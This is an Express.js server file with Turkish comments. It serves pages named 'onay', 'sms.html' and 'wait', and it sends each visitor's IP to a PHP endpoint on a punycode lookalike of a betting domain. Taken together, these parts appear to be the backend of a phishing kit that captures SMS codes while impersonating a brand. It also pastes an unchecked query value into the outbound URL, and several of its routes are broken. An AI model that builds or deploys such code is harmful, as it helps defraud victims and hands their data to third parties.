const express = require('express');
const axios = require('axios');
require('dotenv').config();
const app = express();
const port = process.env.PORT || 3000;
const { readdirSync } = require("fs");

app.use(express.json());
app.use(express.static('public'));

readdirSync("./routes").map((file) => app.use("/", require("./routes/" + file)));

app.get('styles.css', (req, res) => {
  res.sendFile(__dirname + '/public/styles.css');
});

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});
app.get('/head.png', (req, res) => {
  res.sendFile(__dirname + '/public/head.png');
});
app.get('/onay', (req, res) => {
  res.sendFile(__dirname + '/public/onay.html');
});
app.get('/app.css', (req, res) => {
  res.sendFile(__dirname + '/public/app.css');
});
app.get('onay.png', (req, res) => {
  res.sendFile(__dirname + '/public/onay.png');
});

app.get('sms.html', (req, res) => {
  res.sendFile(__dirname + '/public/sms.html');
});
app.get('/wait', (req, res) => {
  res.sendFile(__dirname + '/public/wait.html');
});

app.get('main.37ecf04e837de0a8b04b.css', (req, res) => {
  res.sendFile(__dirname + '/public/main.37ecf04e837de0a8b04b.css');
});

app.get('loading.css', (req, res) => {
  res.sendFile(__dirname + '/public/loading.css');
});
app.get('/vendors.37ecf04e837de0a8b04b.css', (req, res) => {
  res.sendFile(__dirname + '/public/vendors.37ecf04e837de0a8b04b.css');
});


app.get('/api', async (req, res) => {
  try {
    const userIp = req.query.ip;

    // URL'yi oluştur
    const apiUrl = `https://xn--holiganbt930-8d6f.com/tr/datach.php?ip=${userIp}`;

    // Fetch kullanarak GET isteği yap
    const response = await axios.get(apiUrl);

    if (!response.data) {
      throw new Error('Geçersiz yanıt');
    }

    res.json(response.data);
  } catch (error) {
    console.error('Hata:', error);

    // Hata mesajını istemciye gönder
    res.status(500).json({ error: error.message });
  }
});
app.listen(port, () => {
  console.log(`Web sunucusu ${port} adresinde çalışıyor.`);
});
